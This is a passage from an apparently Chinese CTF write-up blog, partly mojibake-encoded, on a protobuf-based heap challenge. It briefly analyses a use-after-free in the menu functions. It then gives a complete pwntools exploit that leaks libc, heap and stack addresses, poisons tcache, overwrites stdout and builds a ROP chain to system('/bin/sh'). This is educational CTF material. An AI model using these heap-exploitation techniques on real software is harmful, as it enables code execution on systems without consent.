</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=ä»£ç åˆ†æ>ä»£ç åˆ†æ<a hidden class=anchor aria-hidden=true href=#ä»£ç åˆ†æ>#</a></h3><h4 id=å…¥å£>å…¥å£<a hidden class=anchor aria-hidden=true href=#å…¥å£>#</a></h4><p><img loading=lazy src=2.png alt=image></p><p>åç§»å’Œ<code>.data.rel.ro</code>ä¸­çš„ç¬¬äº”ä¸ªå­—æ®µæ­£å¥½å¯¹åº”ä¸Š,é™¤äº†v4+32</p><p><img loading=lazy src=3.png alt=image></p><p>ä»a2-a6åˆ†åˆ«æ˜¯ï¼Œcontent todo idx size this</p><h4 id=èœå•>èœå•<a hidden class=anchor aria-hidden=true href=#èœå•>#</a></h4><p><img loading=lazy src=4.png alt=image></p><p>å‡½æ•°0æ˜¯ä»€ä¹ˆéƒ½ä¸å¹²ï¼Œçº¯è§£ææˆ‘ä»¬å‘åŒ…çš„æ•°æ®ï¼Œä½†æ˜¯ä¼šæ ¹æ®æ•°æ®é•¿åº¦åˆ†é…å¯¹åº”å †ï¼Œå¦‚func0(str) &ndash;> malloc(len(str))</p><p>å‡½æ•°1æ˜¯ç”³è¯·0x30çš„chunkï¼Œç„¶åcopyæ•°æ®è¿›å»</p><p>å‡½æ•°2æ˜¯freeï¼Œé‡Œé¢æœ‰UAF</p><p>å‡½æ•°3æ˜¯æ‰“å°æˆ‘ä»¬ç”³è¯·chunkçš„æ•°æ®ï¼Œè¶…è¿‡ä¸¤æ¬¡å…³é—­æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯</p><h3 id=æ¼æ´åˆ©ç”¨>æ¼æ´åˆ©ç”¨<a hidden class=anchor aria-hidden=true href=#æ¼æ´åˆ©ç”¨>#</a></h3><p>é€šè¿‡é—ç•™çš„<code>unsorted bin</code>çš„<code>bk</code>æ¥å¾—åˆ°<code>libc</code>çš„åœ°å€ï¼Œç„¶åé€šè¿‡é‡Šæ”¾ç¬¬ä¸€ä¸ª<code>0x40</code>å¤§å°çš„<code>chunk</code>è¿›å…¥tcacheï¼Œæ‰“å°å‡ºæ¥<code>heap</code>åœ°å€ï¼ŒUAFä¿®æ”¹tcacheçš„fd</p><p>ç”³è¯·åˆ°<code>tcache_perthread_struct</code>,å°†environåœ°å€æ·»åŠ åˆ°sizeä¸º0x40çš„tcacheå †å—ä¸Šï¼Œæ³„éœ²å‡ºstackåœ°å€</p><p>ä¿®æ”¹rspæŒ‡é’ˆï¼Œåœ¨æ ˆä¸Šæ‰“ORW</p><h3 id=exp>exp<a hidden class=anchor aria-hidden=true href=#exp>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>devicemsg_pb2</span>
</span></span><span class=line><span class=cl><span class=n>binary_path</span> <span class=o>=</span> <span class=s1>&#39;./pwn&#39;</span>
</span></span><span class=line><span class=cl><span class=n>libc_path</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>,</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span><span class=s1>&#39;splitw&#39;</span><span class=p>,</span><span class=s1>&#39;-h&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>binary_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libc_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>argv</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[</span><span class=n>binary_path</span><span class=p>,</span> <span class=n>argv</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1>#p=remote(&#39;0.0.0.0&#39;,10002)</span>
</span></span><span class=line><span class=cl><span class=n>leak_addr</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>addr</span><span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>-----&gt;&#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>main_arena_offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=c1>#global_max_fast_offset = 0x3c67f8</span>
</span></span><span class=line><span class=cl><span class=c1>#free_hook_offset = libc.symbols[&#34;__free_hook&#34;]</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>devicemsg_pb2</span><span class=o>.</span><span class=n>devicemsg</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whattodo</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatcon</span> <span class=o>=</span> <span class=n>content</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatidx</span> <span class=o>=</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatsize</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatsthis</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;WHAT DO YOU WANT?&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>.</span><span class=n>SerializeToString</span><span class=p>())</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatcon</span><span class=o>=</span><span class=sa>b</span><span class=s2>&#34;0&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whattodo</span><span class=o>=</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatidx</span><span class=o>=</span><span class=n>idx</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatsize</span><span class=o>=</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatsthis</span><span class=o>=</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;WHAT DO YOU WANT?&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>.</span><span class=n>SerializeToString</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dele</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatcon</span><span class=o>=</span><span class=sa>b</span><span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0xc0</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whattodo</span><span class=o>=</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatidx</span><span class=o>=</span><span class=n>idx</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatsize</span><span class=o>=</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatsthis</span><span class=o>=</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;WHAT DO YOU WANT?&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>.</span><span class=n>SerializeToString</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>clean</span><span class=p>(</span><span class=n>mem</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatcon</span><span class=o>=</span><span class=n>mem</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whattodo</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatidx</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatsize</span><span class=o>=</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>whatsthis</span><span class=o>=</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;WHAT DO YOU WANT?&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>.</span><span class=n>SerializeToString</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pwn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>       <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ngy4ng&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;y4ngy4ng&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_addr</span><span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x21ace0</span> 
</span></span><span class=line><span class=cl>    <span class=n>leak_addr</span><span class=p>(</span><span class=s2>&#34;libc_addr&#34;</span><span class=p>,</span><span class=n>libc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dele</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Content:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_base</span> <span class=o>=</span> <span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>&lt;&lt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x2000</span>
</span></span><span class=line><span class=cl>    <span class=n>leak_addr</span><span class=p>(</span><span class=s2>&#34;heap_base&#34;</span><span class=p>,</span><span class=n>heap_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>dele</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dele</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dele</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dele</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>environ</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;environ&#39;</span><span class=p>]</span> <span class=o>+</span>  <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl>    <span class=n>stdout</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span>  <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span><span class=n>p64</span><span class=p>((</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0xf0</span><span class=p>)</span> <span class=o>^</span><span class=p>((</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x4e40</span><span class=p>)</span><span class=o>&gt;&gt;</span><span class=mi>12</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;AAAAAA&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1>#debug()</span>
</span></span><span class=line><span class=cl>    <span class=n>clean</span><span class=p>((((</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>stdout</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>stdout</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>5</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x10</span><span class=p>))</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xe0</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>#raw_input()</span>
</span></span><span class=line><span class=cl>    <span class=n>clean</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xFBAD1800</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>environ</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>environ</span><span class=o>+</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1>#debug()</span>
</span></span><span class=line><span class=cl>    <span class=n>stack</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x1a8</span> <span class=o>+</span> <span class=mh>0x40</span> <span class=o>-</span> <span class=mh>0x28</span>
</span></span><span class=line><span class=cl>    <span class=n>leak_addr</span><span class=p>(</span><span class=s2>&#34;stack&#34;</span><span class=p>,</span><span class=n>stack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#raw_input()</span>
</span></span><span class=line><span class=cl>    <span class=c1>#debug()</span>
</span></span><span class=line><span class=cl>    <span class=n>clean</span><span class=p>((((</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=p>))</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xa0</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1>#raw_input()</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x000000000002a3e5</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl>    <span class=n>binsh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=mh>0x000000000002a3e6</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>debug</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>clean</span><span class=p>((</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mh>0x28</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x58</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>pwn</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=å‚è€ƒ>å‚è€ƒ<a hidden class=anchor aria-hidden=true href=#å‚è€ƒ>#</a></h2><p><a href=https://mp.weixin.qq.com/s/RYa2wMD1KIC9IMQ_9NktiQ>ACT TEAM</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/pwn/>PWN</a></li><li><a href=http://localhost:1313/tags/protobuf/>Protobuf</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/misc/2024_8-10_month/><span class=title>Â« Prev</span><br><span>å¤§å››ç”Ÿæ´»æ‚è®°</span>
</a><a class=next href=http://localhost:1313/posts/writeups/wmctf/><span class=title>Next Â»</span><br><span>W&amp;MCTF pwn writeups</span></a></nav></footer><div><div class=pagination__title><span class=pagination__title-h style=font-size:20px>ğŸ’¬è¯„è®º</span><hr></div><div id=tcomment></div><script src=https://cdn.staticfile.org/twikoo/1.6.32/twikoo.all.min.js></script><script>twikoo.init({envId:PLACEHOLDER_FOR_ENV_ID,el:"#tcomment",lang:"zh-CN",region:"",path:window.TWIKOO_MAGIC_PATH||window.location.pathname})</script></div></article></main><footer class=footer><div class=busuanzi-footer><span id=busuanzi_container_site_pv>æœ¬ç«™æ€»è®¿é—®é‡<span id=busuanzi_value_site_pv></span>æ¬¡
</span><span id=busuanzi_container_site_uv>æœ¬ç«™è®¿å®¢æ•°<span id=busuanzi_value_site_uv></span>äººæ¬¡</span></div><a href=https://beian.miit.gov.cn/ target=_blank>äº¬ICPå¤‡2024055400å·-1</a>
<span></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>window.addEventListener("load",function(){var t=document.querySelectorAll('.highlight code[class^="language-"]'),n=document.querySelectorAll('.highlight code[class^="hljs "]'),e=!1;t.forEach(function(t,s){t.addEventListener("scroll",function(){e||(e=!0,n[s].scrollTop=t.scrollTop,e=!1)})}),n.forEach(function(n,s){n.addEventListener("scroll",function(){e||(e=!0,t[s].scrollTop=n.scrollTop,e=!1)})})})</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>